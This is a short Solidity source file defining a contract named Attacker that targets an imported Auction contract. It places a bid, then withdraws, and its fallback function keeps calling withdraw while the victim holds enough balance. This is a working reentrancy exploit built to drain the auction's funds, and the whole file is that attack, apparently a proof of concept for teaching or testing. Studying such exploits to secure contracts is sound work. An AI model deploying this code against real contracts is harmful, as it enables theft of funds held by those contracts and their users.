pragma solidity ^0.5.0;

import "./Auction.sol";

contract Attacker {
    Auction public victim_;
    uint public ret;

    constructor(address victim) public{
        victim_ = Auction(victim);
        ret = 2;
    }

    function sendBid() public payable
    {
        victim_.bid.value(msg.value)();
    }

    function collect() public
    {
        if (victim_.withdraw() == true)
            ret = 1;
        else
            ret = 0;
    }

    function () external payable
    {
        if (address(victim_).balance >= msg.value)
        {
            victim_.withdraw();
        }
    }
}
